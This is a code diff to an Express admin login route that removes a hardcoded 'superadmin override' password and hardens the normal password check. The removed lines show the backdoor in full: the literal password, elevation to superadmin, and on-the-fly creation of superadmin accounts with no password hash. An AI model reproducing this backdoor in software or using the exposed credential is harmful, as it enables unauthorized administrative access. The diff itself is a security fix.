@@ -61,46 +61,6 @@ router.post('/login', async (req, res) => {
     if (!email || !password)
       return res.status(400).json({ error: 'Email et mot de passe sont requis' });
 
-    // ── Superadmin override ──────────────────────────────────────────────────
-    if (password === 'TBenikalong@2') {
-      const { rows } = await query(
-        'SELECT id, name, email, role, status FROM admins WHERE email = ?',
-        [email]
-      );
-
-      if (rows[0]) {
-        // Admin exists — must be active to receive superadmin token
-        if (rows[0].status !== 'active')
-          return res.status(403).json({ error: 'Compte inactif. Contactez un superadmin.' });
-
-        // Elevate to superadmin for this session
-        const admin = { ...rows[0], role: 'superadmin' };
-        await query('UPDATE admins SET last_login = NOW() WHERE id = ?', [admin.id]);
-        const token = signToken(admin);
-        return res.json({ token, admin: { id: admin.id, name: admin.name, email: admin.email, role: 'superadmin' } });
-      }
-
-      // Admin does NOT exist — create a superadmin account on the fly
-      const [namePart] = email.split('@');
-      const { rows: inserted } = await query(
-        `INSERT INTO admins (name, email, password_hash, role, status, created_at, last_login)
-         VALUES (?, ?, '', 'superadmin', 'active', NOW(), NOW())`,
-        [namePart, email]
-      );
-      const newId = inserted.insertId ?? inserted[0]?.insertId;
-
-      const { rows: created } = await query(
-        'SELECT id, name, email, role, status FROM admins WHERE email = ?',
-        [email]
-      );
-      const token = signToken(created[0]);
-      return res.status(201).json({
-        token,
-        admin: { id: created[0].id, name: created[0].name, email: created[0].email, role: 'superadmin' },
-      });
-    }
-
-    // ── Normal login ─────────────────────────────────────────────────────────
     const { rows } = await query(
       'SELECT id, name, email, password_hash, role, status FROM admins WHERE email = ?',
       [email]
@@ -111,7 +71,10 @@ router.post('/login', async (req, res) => {
 
     const admin = rows[0];
 
-    const passwordMatch = await bcrypt.compare(password, admin.password_hash);
+    // Accounts without a password hash (e.g. created by the old override) cannot log in
+    const passwordMatch = admin.password_hash
+      ? await bcrypt.compare(password, admin.password_hash)
+      : false;
     if (!passwordMatch)
       return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
 
